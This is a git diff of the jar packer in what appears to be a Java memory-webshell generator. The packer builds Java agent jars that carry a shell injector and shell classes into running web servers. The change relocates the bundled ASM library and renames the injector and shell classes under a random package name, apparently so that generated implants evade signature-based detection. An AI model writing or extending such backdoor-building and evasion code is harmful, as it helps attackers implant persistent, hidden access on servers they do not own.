@@ -1,6 +1,8 @@
 package com.reajason.javaweb.memshell.packer.jar;
 
+import com.reajason.javaweb.asm.ClassRenameUtils;
 import com.reajason.javaweb.memshell.config.GenerateResult;
+import com.reajason.javaweb.memshell.utils.CommonUtil;
 import lombok.SneakyThrows;
 import net.bytebuddy.ByteBuddy;
 import org.apache.commons.io.IOUtils;
@@ -41,24 +43,44 @@ public class AgentJarPacker implements JarPacker {
         manifest.getMainAttributes().putValue("Can-Redefine-Classes", "true");
         manifest.getMainAttributes().putValue("Can-Retransform-Classes", "true");
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+
+        String RELOCATE_PREFIX = CommonUtil.getRandomPackageName().replace(".", "/") + "/";
+        boolean RELOCATE_ENABLED = true;
+
         try (JarOutputStream targetJar = new JarOutputStream(byteArrayOutputStream, manifest)) {
+            String dependencyPackageName = null;
             if (generateResult.getShellConfig().getShellType().endsWith("ASM")) {
-                addDependency(targetJar, Opcodes.class);
+                dependencyPackageName = Opcodes.class.getPackage().getName();
+                addDependency(targetJar, Opcodes.class, true, RELOCATE_PREFIX);
             } else {
-                addDependency(targetJar, ByteBuddy.class);
+                RELOCATE_ENABLED = false;
+                dependencyPackageName = ByteBuddy.class.getPackage().getName();
+                addDependency(targetJar, ByteBuddy.class, false, RELOCATE_PREFIX);
             }
 
+            byte[] injectorBytes = generateResult.getInjectorBytes();
+            if (RELOCATE_ENABLED) {
+                injectorBytes = ClassRenameUtils.relocateClass(injectorBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
+            }
             targetJar.putNextEntry(new JarEntry(mainClass.replace('.', '/') + ".class"));
-            targetJar.write(generateResult.getInjectorBytes());
+            targetJar.write(injectorBytes);
             targetJar.closeEntry();
 
+            byte[] shellBytes = generateResult.getShellBytes();
+            if (RELOCATE_ENABLED) {
+                shellBytes = ClassRenameUtils.relocateClass(shellBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
+            }
             targetJar.putNextEntry(new JarEntry(advisorClass.replace('.', '/') + ".class"));
-            targetJar.write(generateResult.getShellBytes());
+            targetJar.write(shellBytes);
             targetJar.closeEntry();
 
             for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
                 targetJar.putNextEntry(new JarEntry(entry.getKey().replace('.', '/') + ".class"));
-                targetJar.write(entry.getValue());
+                byte[] innerClassBytes = entry.getValue();
+                if (RELOCATE_ENABLED) {
+                    innerClassBytes = ClassRenameUtils.relocateClass(innerClassBytes, dependencyPackageName, RELOCATE_PREFIX + dependencyPackageName);
+                }
+                targetJar.write(innerClassBytes);
                 targetJar.closeEntry();
             }
         }
@@ -66,7 +88,7 @@ public class AgentJarPacker implements JarPacker {
     }
 
     @SneakyThrows
-    public static void addDependency(JarOutputStream targetJar, Class<?> baseClass) {
+    public static void addDependency(JarOutputStream targetJar, Class<?> baseClass, boolean relocate, String relocatePrefix) {
         String packageToMove = baseClass.getPackage().getName().replace('.', '/');
         URL sourceUrl = baseClass.getProtectionDomain().getCodeSource().getLocation();
         String sourceUrlString = sourceUrl.toString();
@@ -89,8 +111,16 @@ public class AgentJarPacker implements JarPacker {
             String entryName = entry.getName();
             if (entryName.startsWith(packageToMove)) {
                 InputStream entryStream = sourceJar.getInputStream(entry);
-                targetJar.putNextEntry(new JarEntry(entryName));
-                IOUtils.copy(entryStream, targetJar);
+                byte[] bytes = IOUtils.toByteArray(entryStream);
+                if (relocate) {
+                    targetJar.putNextEntry(new JarEntry(relocatePrefix + entryName));
+                    if (bytes.length > 0) {
+                        bytes = ClassRenameUtils.relocateClass(bytes, packageToMove, relocatePrefix + packageToMove);
+                    }
+                } else {
+                    targetJar.putNextEntry(new JarEntry(entryName));
+                }
+                targetJar.write(bytes);
                 targetJar.closeEntry();
                 entryStream.close();
             }
